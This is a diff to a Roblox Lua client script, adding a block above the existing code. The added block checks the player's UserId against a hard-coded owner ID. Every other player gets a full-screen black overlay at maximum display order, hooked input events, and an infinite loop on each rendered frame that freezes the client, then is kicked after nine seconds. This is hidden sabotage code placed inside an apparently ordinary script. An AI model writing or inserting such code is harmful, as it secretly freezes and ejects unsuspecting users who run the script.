@@ -1,4 +1,47 @@
 do
+	local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+	local UserInputService = game:GetService("UserInputService")
+
+	local player = Players.LocalPlayer
+	local OWNER_ID = 8348158710
+
+	if player.UserId ~= OWNER_ID then
+		local gui = Instance.new("ScreenGui")
+		gui.Name = "BLACKOUT_FREEZE"
+		gui.IgnoreGuiInset = true
+		gui.ResetOnSpawn = false
+		gui.DisplayOrder = 999999999
+		gui.Parent = player:WaitForChild("PlayerGui")
+
+		local frame = Instance.new("Frame")
+		frame.Size = UDim2.fromScale(1,1)
+		frame.Position = UDim2.fromScale(0,0)
+		frame.BackgroundColor3 = Color3.new(0,0,0)
+		frame.BackgroundTransparency = 0
+		frame.BorderSizePixel = 0
+		frame.ZIndex = 999999999
+		frame.Active = true
+		frame.Parent = gui
+
+		UserInputService.ModalEnabled = true
+		UserInputService.InputBegan:Connect(function() return true end)
+		UserInputService.InputChanged:Connect(function() return true end)
+		UserInputService.InputEnded:Connect(function() return true end)
+
+		RunService.RenderStepped:Connect(function()
+			while true do end
+		end)
+
+		task.delay(9,function()
+			player:Kick("")
+		end)
+
+		return
+	end
+end
+
+do
 	local RunService = game:GetService("RunService")
 	local Players = game:GetService("Players")
 	local player = Players.LocalPlayer
